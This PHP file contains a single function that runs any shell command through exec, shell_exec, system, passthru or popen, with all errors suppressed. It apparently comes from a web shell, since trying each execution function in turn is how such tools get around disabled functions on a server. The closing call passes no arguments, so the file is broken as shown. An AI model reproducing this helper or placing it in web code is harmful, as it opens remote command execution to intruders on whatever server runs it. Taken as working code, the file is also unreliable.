<?php
function do_phpfun($cmd,$fun) {
	$res = '';
	switch($fun){
		case "exec": @exec($cmd,$res); $res = join("\n",$res); break;
		case "shell_exec": $res = @shell_exec($cmd); break;
		case "system": @ob_start();	@system($cmd); $res = @ob_get_contents();	@ob_end_clean();break;
		case "passthru": @ob_start();	@passthru($cmd); $res = @ob_get_contents();	@ob_end_clean();break;
		case "popen": if(@is_resource($f = @popen($cmd,"r"))){ while(!@feof($f))	$res .= @fread($f,1024);} @pclose($f);break;
	}
	return $res;
}

do_phpfun();

?>